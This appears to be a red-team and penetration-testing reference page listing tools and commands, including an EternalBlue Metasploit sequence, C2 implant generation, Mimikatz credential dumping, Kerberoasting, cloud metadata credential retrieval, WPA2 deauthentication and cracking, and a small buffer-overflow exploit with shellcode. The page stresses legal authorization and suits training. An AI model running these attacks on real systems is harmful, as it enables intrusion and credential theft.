---
title: Offensive Security (Red Team)
description: Penetration testing, red teaming, exploit development, social engineering, wireless and physical security testing
---

# :fontawesome-solid-user-secret: Offensive Security (Red Team)

The art of breaking things professionally. Simulate attackers to find vulnerabilities before real adversaries do. Penetration testing, red teaming, exploit development, social engineering. You get paid to hack legally. Living the dream until the lawyers get involved.

!!! tip "2026 Update"
    AI-powered vulnerability discovery tools. Cloud-native pentesting focus (AWS/Azure/GCP). Container escape techniques standard. API security testing essential. Bug bounties pay $1M+ for critical vulns. Purple teaming replacing pure red/blue divide.

______________________________________________________________________

## :fontawesome-solid-bolt-lightning: Quick Hits

=== ":fontawesome-solid-list-check: Core Disciplines"

    **Penetration Testing:**
    ```bash
    # Reconnaissance (OSINT)
    theHarvester -d target.com -b all        # Email harvesting
    amass enum -d target.com                 # Subdomain enumeration
    subfinder -d target.com -silent          # (1)!

    # Scanning
    nmap -sC -sV -oA scan target.com        # Service detection
    masscan -p1-65535 10.0.0.0/8 --rate=10000  # Fast port scan

    # Vulnerability scanning
    nuclei -u https://target.com -t cves/    # (2)!
    nikto -h https://target.com              # Web server scan

    # Web exploitation
    sqlmap -u "http://target.com/page?id=1" --dbs  # SQL injection  # (3)!
    ffuf -u https://target.com/FUZZ -w wordlist.txt  # Directory fuzzing

    # Exploitation frameworks
    msfconsole                               # Metasploit Framework
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 10.0.0.1
    exploit
    ```

    1. Subdomain discovery critical for attack surface mapping
    2. Nuclei templates cover CVEs, misconfigs, exposures
    3. SQLMap automates SQL injection (but learn manual first)

    **Red Teaming:**
    ```bash
    # C2 Frameworks (Command & Control)
    # Cobalt Strike (commercial, $3.5k/user/year)
    ./teamserver 10.0.0.1 password123 profile.yml

    # Sliver (open source C2)  # (1)!
    sliver-server
    generate --mtls 10.0.0.1 --os windows --format exe

    # Empire/Starkiller (PowerShell-based)
    python empire --rest --password password123

    # Social engineering
    gophish                                  # Phishing framework  # (2)!
    setoolkit                                # Social Engineering Toolkit

    # Credential harvesting
    responder -I eth0 -wrf                   # LLMNR/NBT-NS poisoning
    mimikatz.exe                             # Windows credential dumping
    pypykatz lsa minidump lsass.dmp         # Python Mimikatz

    # Lateral movement
    crackmapexec smb 10.0.0.0/24 -u admin -p password --shares  # (3)!
    evil-winrm -i 10.0.0.1 -u admin -p password
    ```

    1. Sliver modern alternative to Cobalt Strike (free, active development)
    2. Gophish tracks email opens, clicks, credential submissions
    3. CrackMapExec Swiss Army knife for network pentesting

    **Exploit Development:**
    ```python
    # Basic buffer overflow exploit (x86)
    import struct

    # Bad characters: \x00 (null), \x0a (newline), \x0d (carriage return)
    shellcode = (
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
        b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    )  # execve("/bin/sh")  # (1)!

    offset = 112  # EIP overwrite offset
    eip = struct.pack("<I", 0xdeadbeef)  # Return address
    nop_sled = b"\x90" * 16

    exploit = b"A" * offset + eip + nop_sled + shellcode
    ```

    1. Shellcode executes /bin/sh (Linux x86 example)

    **Real talk:**

    - Legal authorization is non-negotiable (get it in writing)
    - Modern targets: APIs, cloud infrastructure, containers
    - Automated tools find 80%, manual testing finds critical 20%
    - Bug bounties democratized offensive security (HackerOne, Bugcrowd)
    - OSCP cert still gold standard (Offensive Security Certified Professional)

=== ":fontawesome-solid-bolt: Common Patterns"

    **Web Application Pentesting:**
    ```bash
    # 1. Reconnaissance
    whatweb https://target.com               # Tech stack identification
    wafw00f https://target.com               # WAF detection

    # 2. Content discovery
    gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404  # (1)!

    # 3. Parameter fuzzing
    wfuzz -c -z file,params.txt https://target.com/api?FUZZ=test

    # 4. SQL injection testing
    sqlmap -u "https://target.com/api?id=1" --batch --level=5 --risk=3  # (2)!

    # 5. XSS testing
    dalfox url https://target.com/search?q=test  # (3)!

    # 6. API testing
    postman                                  # API client
    burp suite                               # Intercept/modify requests
    ```

    1. ffuf faster than gobuster, better filtering
    2. Level 5 tests all parameters, Risk 3 includes dangerous payloads
    3. Dalfox modern XSS scanner with DOM-based detection

    **Internal Network Pentesting:**
    ```bash
    # 1. Network discovery
    nmap -sn 10.0.0.0/24                     # Ping sweep
    netdiscover -r 10.0.0.0/24              # ARP scanning

    # 2. Service enumeration
    nmap -sV -sC -p- 10.0.0.0/24 -oA full_scan  # All ports, scripts

    # 3. SMB enumeration
    enum4linux -a 10.0.0.1                  # SMB enumeration
    smbmap -H 10.0.0.1 -u guest             # Share enumeration

    # 4. Kerberos attacks
    GetNPUsers.py domain.local/ -dc-ip 10.0.0.1  # ASREPRoast  # (1)!
    GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1  # Kerberoast

    # 5. Post-exploitation
    bloodhound-python -u user -p pass -ns 10.0.0.1 -d domain.local  # (2)!
    mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
    ```

    1. ASREPRoast targets accounts with "Do not require Kerberos preauthentication"
    2. BloodHound maps AD attack paths (visual graph database)

    **Cloud Pentesting (AWS):**
    ```bash
    # AWS enumeration
    aws sts get-caller-identity              # Check AWS credentials
    aws s3 ls                                # List S3 buckets
    aws ec2 describe-instances              # List EC2 instances

    # S3 bucket enumeration
    aws s3 ls s3://bucket-name --no-sign-request  # Public bucket  # (1)!

    # IAM privilege escalation
    pacu                                     # AWS exploitation framework  # (2)!
    run iam__enum_permissions
    run iam__privesc_scan

    # Cloud metadata exploitation
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/  # (3)!
    ```

    1. --no-sign-request tests public access (misconfiguration common)
    2. Pacu like Metasploit for AWS (automated attack chains)
    3. IMDS v1 metadata service (SSRF goldmine if accessible)

    **Wireless Hacking:**
    ```bash
    # Monitor mode
    airmon-ng start wlan0                    # Enable monitor mode

    # Capture handshake
    airodump-ng wlan0mon                     # Scan networks
    airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # (1)!
    aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon  # Deauth attack

    # Crack WPA2
    aircrack-ng -w rockyou.txt capture.cap   # Dictionary attack
    hashcat -m 22000 capture.hc22000 rockyou.txt  # (2)!

    # WPS attacks
    reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv  # WPS PIN brute force
    ```

    1. Capture 4-way WPA handshake (requires client deauth/auth)
    2. Hashcat GPU-accelerated (100x faster than aircrack)

    **Why this works:**

    - Kill chain: Recon → Exploit → Pivot → Exfiltrate
    - Living off the land (LOLBins) bypasses antivirus
    - C2 frameworks automate post-exploitation
    - BloodHound visualizes AD attack paths
    - Cloud metadata services often exposed (SSRF)

=== ":fontawesome-solid-fire: Pro Tips & Gotchas"

    !!! success "Best Practices"
        - **Legal authorization** - Written permission, defined scope, NDA
        - **OPSEC** - Cover tracks, avoid detection (in red team engagements)
        - **Documentation** - Screenshot everything, detailed notes
        - **Staged approach** - Recon → Scanning → Exploitation → Reporting
        - **Communication** - Daily updates to client POC
        - **Responsible disclosure** - 90-day disclosure timeline standard
        - **Clean up** - Remove backdoors, close connections after engagement

    !!! warning "Legal & Ethical"
        - **CFAA** - Computer Fraud and Abuse Act (US) serious consequences
        - **Scope creep** - Stay within defined scope (don't pivot to out-of-scope)
        - **Data handling** - Minimize PII collection, secure storage
        - **Bug bounty rules** - Read policy carefully (some prohibit automation)
        - **Responsible disclosure** - Coordinate Fix → Disclose → Publish
        - **Authorization** - Get explicit written permission before testing

    !!! tip "Tools & Resources"
        - **Kali Linux** - 600+ preinstalled security tools
        - **Parrot OS** - Privacy-focused alternative to Kali
        - **Burp Suite Pro** - $449/year (essential for web pentesting)
        - **Cobalt Strike** - $3500/user/year (gold standard C2)
        - **OSCP certification** - $1649 (90 days lab + exam attempt)
        - **HackTheBox/TryHackMe** - Practice labs ($10-20/month)

    !!! danger "Gotchas"
        - **Attribution** - Governments track you (VPNs not foolproof)
        - **Collateral damage** - DoS testing can crash production
        - **Third parties** - Scope may not include CDN, hosting provider
        - **False positives** - Automated scanners generate noise
        - **WAF evasion** - Modern WAFs block 90% of automated tools
        - **EDR/AV** - Endpoint detection makes post-exploitation harder
        - **Cloud logging** - AWS CloudTrail records everything

______________________________________________________________________

## :fontawesome-solid-graduation-cap: Learning Paths

### :fontawesome-solid-book-open: Certifications

- **[OSCP](https://www.offensive-security.com/pwk-oscp/)** - $1649, 24h practical exam, gold standard
- **[PNPT](https://certifications.tcm-sec.com/pnpt/)** - $399, affordable alternative to OSCP
- **[GPEN](https://www.giac.org/certifications/penetration-tester-gpen/)** - $2499, SANS training expensive but comprehensive
- **[eCPPT](https://elearnsecurity.com/product/ecpptv2-certification/)** - $400, pivot-focused
- **[CRTO](https://www.zeropointsecurity.co.uk/red-team-ops)** - $550, red team operations

### :fontawesome-solid-rocket: Practice Platforms

- **[HackTheBox](https://www.hackthebox.com/)** - $14/month VIP, realistic machines
- **[TryHackMe](https://tryhackme.com/)** - $10/month, beginner-friendly guided paths
- **[PentesterLab](https://pentesterlab.com/)** - $20/month, web exploitation focus
- **[PortSwigger Academy](https://portswigger.net/web-security)** - Free, web security learning

______________________________________________________________________

## :fontawesome-solid-wrench: Essential Toolkit

| Category | Tools | Purpose |
|----------|-------|---------|
| **Recon** | theHarvester, Amass, subfinder | OSINT, subdomain enumeration |
| **Scanning** | nmap, masscan, nuclei | Port/vulnerability scanning |
| **Web** | Burp Suite, OWASP ZAP, sqlmap | Web application testing |
| **Exploitation** | Metasploit, Sliver, Cobalt Strike | Exploitation frameworks |
| **Post-Exploit** | Mimikatz, BloodHound, Rubeus | Credential dumping, AD enumeration |
| **Network** | CrackMapExec, Responder, Impacket | Internal network testing |
| **Cloud** | Pacu, ScoutSuite, CloudFox | AWS/Azure/GCP testing |

______________________________________________________________________

**Last Updated:** 2026-02-02 | **Vibe Check:** :fontawesome-solid-skull-crossbones: **Break Things Legally** - Most fun security job. Requires constant learning (new vulns daily). Legal risks real (get authorization in writing). Bug bounties democratized field. OSCP still gold standard cert.

**Tags:** offensive-security, pentesting, red-team, hacking, exploit-dev
